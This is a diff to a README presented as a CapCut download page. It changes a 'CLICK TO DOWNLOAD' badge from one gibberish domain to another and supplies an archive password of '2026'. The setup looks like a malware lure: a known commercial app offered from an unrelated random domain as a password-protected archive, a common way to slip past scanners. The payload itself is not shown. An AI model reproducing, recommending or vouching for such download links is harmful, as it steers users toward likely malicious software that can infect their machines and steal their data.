@@ -1,6 +1,6 @@
 # CapCut
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/CapCut-Latest-Version-2026)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/CapCut-Latest-Version-2026)
 > #### Archive password: `2026`
 
 CapCut is an easy-to-use video editor for creating professional-looking videos with effects, transitions, animated text, audio tools, and AI-powered features.
